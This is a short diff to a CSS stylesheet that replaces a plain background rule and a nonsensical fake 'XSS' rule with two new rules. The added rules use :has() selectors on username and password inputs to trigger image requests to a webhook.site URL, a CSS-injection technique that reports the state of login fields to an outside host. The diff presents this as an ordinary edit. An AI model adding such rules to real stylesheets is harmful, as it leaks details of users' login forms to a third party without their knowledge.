@@ -1,8 +1,2 @@
-body {
-  background-color: #ffffff;
-}
-
-/* malicious code injected by attacker */
-script {
-  alert("XSS attack!");
-}
+html:has(input[name="username"][value]) { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?has=username_attr) }
+html:has(input[type="password"][value]) { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?has=password_attr) }
